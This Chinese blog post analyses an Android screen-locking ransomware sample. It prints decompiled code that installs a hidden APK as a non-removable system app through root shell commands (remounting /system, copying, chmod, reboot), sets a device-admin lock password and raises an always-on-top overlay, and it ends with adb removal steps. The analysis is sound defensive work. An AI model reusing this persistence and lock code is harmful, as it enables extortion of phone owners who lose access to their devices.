---
layout: post
title: 对安卓锁机恶意程序反编译分析
date: 2017-01-08 14:08:50
comments: true
tags:
	- 安卓
	- 反编译
---

## 前言
>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。
>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。

## 正文
>锁机恶意程序一共分为两种：
1、通过设备管理器锁机加密码<!--more-->
2、设置一个view至栈顶端。

### 第一种
> 在上一篇博文中的安全卫士中有用到这个设备管理器。
> 原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。


### 第二种
> 这种也就是这篇博文主要讲的了。
> ApkTool用来逆向反编译。
> 主要文件，混淆了方法名和类名。
> ![](/images/1.8/01.png)
> ![](/images/1.8/02.png)
> 重要的是ijm-x86.so这个so文件,后面有讲解
> 先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码
```java
  @Override
  protected void onCreate(Bundle paramBundle)
  {
    LogCatBroadcaster.start(this);
    super.onCreate(paramBundle);
    setContentView(2130903040);
    this.b = ((Button)findViewById(2131099651));
    this.t = ((EditText)findViewById(0));
    Button localButton = this.b;
    ButtonClickListener localButtonClickListener = new ButtonClickListener();
    localButton.setOnClickListener(localButtonClickListener);
    try
    {
      StringBuffer localStringBuffer = new StringBuffer();
      d(this.path + "/zihao.l");
      return;
    }
    catch (IOException localIOException)
    {
    }
  }
```
> this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。
> 
```java
  private void d(String paramString)
    throws IOException
  {
    FileOutputStream localFileOutputStream = new FileOutputStream(paramString);
    InputStream localInputStream = getAssets().open("ijm-x86.so");
    byte[] arrayOfByte = new byte[1024];
    for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte))
    {
      if (i <= 0)
      {
        localFileOutputStream.flush();
        localInputStream.close();
        localFileOutputStream.close();
        return;
      }
      localFileOutputStream.write(arrayOfByte, 0, i);
    }
  }
```
> 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l
> 再来看看ButtonClickListener的点击事件。
```java
    private final class ButtonClickListener
    implements View.OnClickListener
  {
    public ButtonClickListener()
    {
    }

    @Override
    public void onClick(View paramView)
    {
      b localb = new b();
      localb.rootShell();
      a.deleteFile(c.this.file);
    }
  }
```
>执行了b对象中的rootShell方法。我们继续跟进。
```java
  void rootShell()
  {
    execCommand(new String[] { "mount -o rw,remount /system", "mount -o rw,remount /system/app", "cp /sdcard/zihao.l /system/app/", "chmod 777 /system/app/zihao.l", "mv /system/app/zihao.l /system/app/zihao.apk", "chmod 644 /system/app/zihao.apk", "reboot" }, true);
  }
```
>很明显，这个是执行shell命令的代码。
>先把/system 和 /system/app 设置可读可写。
>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。
>最后再重启。
>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。
>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。

### 分析第二层
>同样的手法，找到app的入口Activity.

```java
  @Override
  public void onCreate(Bundle paramBundle)
  {
    LogCatBroadcaster.start(this);
    super.onCreate(paramBundle);
    activiteDevice();
  }
```

继续跟进

```java
  private void activiteDevice()
  {
    Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    NoClassDefFoundError localNoClassDefFoundError;
    try
    {
      Class localClass = Class.forName("com.h.MyAdmin");
      ComponentName localComponentName = new ComponentName(this, localClass);
      localIntent.putExtra("android.app.extra.DEVICE_ADMIN", localComponentName);
      startActivityForResult(localIntent, 0);
      return;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());
    }
    throw localNoClassDefFoundError;
  }
```
>操作打开激活设备管理器的界面

>来看看MyAdmin里面的代码。

```java
 @Override
  public void onEnabled(Context paramContext, Intent paramIntent)
  {
    String str = Integer.toString(1997);
    NoClassDefFoundError localNoClassDefFoundError;
    try
    {
      Class localClass = Class.forName("com.h.s");
      Intent localIntent = new Intent(paramContext, localClass);
      localIntent.setFlags(268435456);
      paramContext.startService(localIntent);
      getManager(paramContext).resetPassword(str, 0);
      super.onEnabled(paramContext, paramIntent);
      return;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());
    }
    throw localNoClassDefFoundError;
  }
```
>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。
>跟进看看这个服务做了些什么。
>s里面杂乱代码太多，我们直接来看主要的。
```java
  private void c()
  {
    WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams();
    this.wmParams = localLayoutParams;
    Application localApplication = getApplication();
    getApplication();
    this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));
    this.wmParams.type = 2010;
    this.wmParams.format = 1;
    this.wmParams.flags = 1280;
    this.wmParams.gravity = 49;
    this.wmParams.x = 0;
    this.wmParams.y = 0;
    this.wmParams.width = -1;
    this.wmParams.height = -1;
    this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null);
    MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648);
    localMediaPlayer.setLooping(true);
    localMediaPlayer.start();
    this.mWindowManager.addView(this.mFloatLayout, this.wmParams);
    this.bt = ((Button)this.mFloatLayout.findViewById(2131361794));
    this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792));
    this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793));
    try
    {
      this.ed.setHint("宝贝在这输入密码！");
      this.tv.append("恭喜中奖");
      Button localButton = this.bt;
      100000001 local100000001 = new View.OnClickListener()
      {
        @Override
        public void onClick(View paramView)
        {
          try
          {
            if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString("passw", ""))))
            {
              s.access$L1000001(s.this).removeView(s.access$L1000002(s.this));
              s.this.stopSelf();
            }
            return;
          }
          catch (Exception localException)
          {
          }
        }
      };
      localButton.setOnClickListener(local100000001);
    }
    catch (Exception localException1)
    {
      try
      {
        TextView localTextView = this.tv;
        StringBuffer localStringBuffer1 = new StringBuffer();
        StringBuffer localStringBuffer2 = new StringBuffer();
        localTextView.append(localStringBuffer2.append("\n").append(this.des.decrypt("e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c")).toString() + this.share.getLong("m", 0));
        return;
        localException1 = localException1;
      }
      catch (Exception localException2)
      {
      }
    }
  }
```
> 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。
> 重点：布局文件的type和flags属性。
> 可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。

## 总结
>这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。
>由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了

## 解决办法。
>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，
>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。

## 末尾
>为了不让恶意程序流传，我就不分享源程序了。
>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。
链接: [http://pan.baidu.com/s/1mi0roJA](http://pan.baidu.com/s/1mi0roJA) 密码: 6xqi